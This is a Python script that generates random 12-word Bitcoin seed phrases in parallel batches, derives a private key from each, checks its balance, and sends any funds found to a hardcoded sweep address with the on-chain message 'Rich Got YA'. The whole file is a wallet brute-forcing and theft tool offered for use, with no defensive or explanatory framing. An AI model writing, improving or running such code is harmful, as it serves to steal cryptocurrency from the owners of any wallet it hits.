import hashlib
import codecs
from bit import Key, PrivateKey
from bit.exceptions import InsufficientFunds
import base58
from mnemonic import Mnemonic
from bip32utils import BIP32Key
import concurrent.futures
import multiprocessing
import time

# Address to sweep funds to
sweep_address = "3FxQzNxA1MYEjmtQjEYfKisLPYq1b7hBCf"

HARDENED_KEY_START = 0x80000000

# ANSI escape codes for colors
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

def sha256(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()

def private_key_to_wif(private_key):
    extended_key = "80" + private_key
    first_sha256 = sha256(codecs.decode(extended_key, 'hex_codec'))
    second_sha256 = sha256(codecs.decode(first_sha256, 'hex_codec'))
    checksum = second_sha256[:8]
    final_key = extended_key + checksum
    wif = base58.b58encode(codecs.decode(final_key, 'hex_codec')).decode('utf-8')
    return wif

def sweep_funds(private_key_wif):
    try:
        key = PrivateKey(private_key_wif)
        balance = key.get_balance('btc')
        balance = float(balance)

        if balance > 0:
            try:
                outputs = [
                    (sweep_address, balance, 'btc'),
                    ('data:Rich Got YA', 0)
                ]
                tx_hash = key.send(outputs, fee='fastest')
                print(f"{YELLOW}Transaction sent: {tx_hash}{RESET}")
            except InsufficientFunds as e:
                print(f"{RED}Insufficient funds to send transaction: {e}{RESET}")
        else:
            print(f"{RED}Insufficient balance for address: {key.address}{RESET}")
    except Exception as e:
        print(f"{RED}Error handling key {private_key_wif}: {e}{RESET}")

def generate_private_key_from_mnemonic(mnemonic_phrase):
    seed = Mnemonic.to_seed(mnemonic_phrase)
    bip32_root_key = BIP32Key.fromEntropy(seed)
    bip32_child_key = bip32_root_key.ChildKey(44 + HARDENED_KEY_START).ChildKey(0 + HARDENED_KEY_START).ChildKey(0 + HARDENED_KEY_START).ChildKey(0).ChildKey(0)
    return bip32_child_key.WalletImportFormat()

def generate_mnemonic():
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=128)  # 128 bits of entropy will generate a 12-word phrase

def process_mnemonic(_):
    mnemonic_phrase = generate_mnemonic()
    private_key_wif = generate_private_key_from_mnemonic(mnemonic_phrase)
    sweep_funds(private_key_wif)

def main():
    num_workers = multiprocessing.cpu_count() * 2  # Adjust based on your system's capability

    with concurrent.futures.ProcessPoolExecutor(max_workers=num_workers) as executor:
        while True:
            futures = [executor.submit(process_mnemonic, i) for i in range(100)]  # Process 100 mnemonics per batch
            concurrent.futures.wait(futures)
            time.sleep(0.1)  # Adjust sleep to control speed

if __name__ == "__main__":
    main()
